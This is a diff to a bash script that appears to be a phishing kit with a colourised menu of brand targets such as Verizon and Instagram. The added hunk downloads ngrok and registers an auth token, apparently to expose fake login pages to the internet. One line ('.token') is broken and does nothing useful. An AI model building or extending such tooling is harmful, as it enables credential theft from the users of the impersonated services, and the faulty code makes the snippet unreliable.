@@ -37,6 +37,26 @@ printf "          \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;91m Verizon\e[
 
 read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
 
+# Ngrok Auth Token Validation
+NC=$(which ngrok)
+if [[ ${NC} == "" ]]; then
+  # If Ngrok if not found in system path, it checks for ngrok exec in current dir
+  # If not found it downloads ngrok (Linux)
+  if [[ ! -f 'ngrok' ]]; then
+    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
+    unzip ngrok-stable-linux-amd64.zip
+    rm ngrok-stable-linux-amd64.zip
+  fi
+  # If .token file not found indicating ngrok auth token has been given
+  # Asks user for authtoken and runs auth process
+  # If all checks are passed this section silently runs through
+  if [[ ! -f '.token' ]]; then
+    echo -n "Please enter your Ngrok Auth Token: "
+    read TOKEN
+    ./ngrok authtoken ${TOKEN}
+    .token
+  fi
+fi
 
 if [[ $option == 1 ]]; then
 server="instagram"
